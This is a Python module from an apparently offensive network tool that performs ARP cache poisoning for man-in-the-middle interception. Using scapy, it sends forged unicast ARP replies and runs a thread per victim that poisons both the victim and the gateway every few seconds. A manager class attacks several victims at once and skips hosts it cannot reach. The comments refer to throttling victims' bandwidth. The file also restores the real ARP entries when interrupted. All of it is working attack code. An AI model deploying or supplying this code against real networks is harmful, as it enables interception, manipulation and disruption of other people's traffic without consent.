"""
modules/spoofer.py

ARP poisoning (MITM) logic, inherited from the original monolithic script
and extended to support MULTIPLE simultaneous victims via threads.

Design: each poisoned victim runs on its own thread (`SpoofSession`) with
a `threading.Event` acting as a switch. `SpoofManager` keeps the registry
of all active sessions so the kill-switch (a single SIGINT signal in
internuncio.py) can walk through them and restore the real ARP state of
ALL of them at once, instead of only being able to handle one victim.
"""

import threading
import time

from scapy.all import ARP, Ether, sendp

import config
from utils.logger import log_info, log_ok, log_err, log_warn
from utils.network_utils import get_mac


def send_fake_arp(dst_ip: str, dst_mac: str, spoofed_ip: str, interface: str):
    """
    Sends ONE unsolicited ARP "is-at" reply (gratuitous ARP) telling
    `dst_ip` that the MAC for `spoofed_ip` is ours (the interface it's
    sent from). This is the "poison" packet: repeating it every few
    seconds overwrites the legitimate entry in the target's ARP cache
    before it can expire on its own.

    Built as a full Ethernet frame (Ether/ARP) sent with `sendp()`
    instead of the L3 `send()`: this way the packet goes out unicast,
    addressed directly to `dst_mac` at the link layer, over the exact
    `interface` requested — `send()` operates at L3 and picks the
    egress interface from the routing table, silently ignoring the
    `iface` argument and broadcasting the ARP reply instead of unicasting it.
    """
    frame = Ether(dst=dst_mac) / ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=spoofed_ip)
    sendp(frame, iface=interface, verbose=False)


def restore_arp(dst_ip: str, dst_mac: str, src_ip: str, src_mac: str, interface: str):
    """
    ARP kill-switch for ONE victim: resends the CORRECT ARP reply (with
    the real MAC of the IP's owner) several times, forcing the target's
    ARP cache back to its legitimate state before finishing. Without
    this, the poisoning would linger for several more minutes (until the
    ARP entry naturally times out).
    """
    frame = Ether(dst=dst_mac) / ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac)
    sendp(frame, iface=interface, count=5, verbose=False)


class SpoofSession:
    """
    Represents the active ARP poisoning against ONE specific victim.

    Modeled as a class (instead of loose functions, like in the original
    script) because multi-target mode needs to keep a list of sessions
    alive, each with its own thread and its own `stop_event`, so they can
    be stopped and restored independently and in an orderly fashion.
    """

    def __init__(self, target_ip: str, gateway_ip: str, interface: str):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.interface = interface
        self.target_mac = None
        self.gateway_mac = None
        self.stop_event = threading.Event()
        self.thread = None

    def resolve_macs(self):
        """Resolves the real MACs of victim and gateway before anything can be spoofed."""
        log_info(f"[{self.target_ip}] Resolving MACs (victim and gateway)...")
        self.target_mac = get_mac(self.target_ip, self.interface)
        self.gateway_mac = get_mac(self.gateway_ip, self.interface)
        log_ok(f"[{self.target_ip}] Victim MAC: {self.target_mac} | Gateway MAC: {self.gateway_mac}")

    def _poison_loop(self):
        """
        Loop that runs on a dedicated thread: resends the ARP poison in
        both directions (victim<->gateway) every `config.POISON_INTERVAL`
        seconds, until `stop_event` is set from outside.

        Send failures are caught and logged instead of left to kill the
        thread: a low --bandwidth (tc tbf shapes the WHOLE interface,
        not just the victim's traffic) can throttle our own outgoing
        ARP packets enough to raise OSError (ENOBUFS) here. Without
        this, that one failed send would silently end the poisoning for
        this victim — no crash, no message, just a session that quietly
        stops doing anything.
        """
        while not self.stop_event.is_set():
            try:
                send_fake_arp(self.target_ip, self.target_mac, self.gateway_ip, self.interface)
                send_fake_arp(self.gateway_ip, self.gateway_mac, self.target_ip, self.interface)
            except Exception as e:
                log_warn(f"[{self.target_ip}] Poison packet send failed, will retry: {e}")
            time.sleep(config.POISON_INTERVAL)

    def start(self):
        """Resolves MACs (if missing) and starts the continuous poisoning thread."""
        if self.target_mac is None or self.gateway_mac is None:
            self.resolve_macs()
        self.thread = threading.Thread(target=self._poison_loop, daemon=True)
        self.thread.start()

    def stop_and_restore(self):
        """Stops this session's thread and restores the real ARP state of victim and gateway."""
        self.stop_event.set()
        if self.thread:
            self.thread.join(timeout=2)
        try:
            restore_arp(self.target_ip, self.target_mac, self.gateway_ip, self.gateway_mac, self.interface)
            restore_arp(self.gateway_ip, self.gateway_mac, self.target_ip, self.target_mac, self.interface)
            log_ok(f"[{self.target_ip}] ARP restored (victim and gateway).")
        except Exception as e:
            log_err(f"[{self.target_ip}] Error restoring ARP: {e}")


class SpoofManager:
    """
    Central registry of ALL active spoofing sessions.

    Exists so that internuncio.py's kill-switch (a single SIGINT signal)
    can walk through and restore N simultaneous victims in one call,
    instead of needing to know in advance how many sessions are active.
    It also enforces config.MAX_THREADS here: past that number, new
    targets are rejected instead of being launched unchecked.
    """

    def __init__(self):
        self.sessions = []
        self._lock = threading.Lock()

    def add_target(self, target_ip: str, gateway_ip: str, interface: str) -> SpoofSession:
        """
        Creates and starts a spoofing session for one victim.

        `session.start()` resolves MACs via ARP against a real host on
        the network — it can fail if that host went offline between
        --scan and the attack (typical of mobile devices with a
        randomized MAC, which may also just turn WiFi off). The
        exception is caught here so that ONE unreachable host doesn't
        abort the whole multi-target attack: it's logged and the rest
        of the victims keep going.
        """
        with self._lock:
            if len(self.sessions) >= config.MAX_THREADS:
                log_err(
                    f"Limit of {config.MAX_THREADS} simultaneous victims reached; "
                    f"{target_ip} is ignored."
                )
                return None
        session = SpoofSession(target_ip, gateway_ip, interface)
        try:
            session.start()
        except Exception as e:
            log_err(f"[{target_ip}] Could not start spoofing session, skipping: {e}")
            return None
        with self._lock:
            self.sessions.append(session)
        return session

    def restore_all(self):
        """Called from the SIGINT handler: restores ARP for ALL active victims."""
        with self._lock:
            sessions = list(self.sessions)
        for session in sessions:
            session.stop_and_restore()
